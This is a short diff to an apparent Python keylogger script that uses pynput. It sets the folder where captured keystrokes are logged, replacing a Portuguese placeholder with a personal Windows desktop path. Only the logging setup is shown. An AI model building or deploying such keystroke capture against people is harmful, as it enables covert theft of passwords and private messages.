@@ -10,7 +10,8 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-gitlog_dir = "LOCAL AONDE SE VAI GUARDAR OS LOGS"
+# log_dir = "LOCAL AONDE SE VAI GUARDAR OS LOGS"
+log_dir = 'C:\\Users\\klesley.goncalves.UFTNET\\Desktop\\Klesley\\Keylogger\\Logs\\'
 
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
